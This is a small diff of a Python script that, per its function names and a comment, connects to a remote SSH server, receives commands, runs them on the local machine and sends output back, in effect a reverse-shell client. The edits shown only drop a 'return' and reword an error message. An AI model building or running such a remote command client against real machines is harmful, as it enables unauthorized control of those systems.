@@ -37,7 +37,6 @@ def shell(client_session):
             path = " ".join(command[1:])
             os.chdir(path)
             client_session.send(f'Path changed to: {path}')
-            return
         elif command[0] == "getpath":
             if platform.system() == "Windows":
                 process_exec(client_session, "cd")
@@ -54,7 +53,7 @@ def process_commands(client_session):
     elif command[0] == "shell":
         shell(client_session)
     else:
-        client_session.send("Command not found")
+        client_session.send("Client command not found")
 
 #connect to the remote ssh server and recieve commands to be #executed and send back output
 def ssh_command(server_address, server_port, username, password):
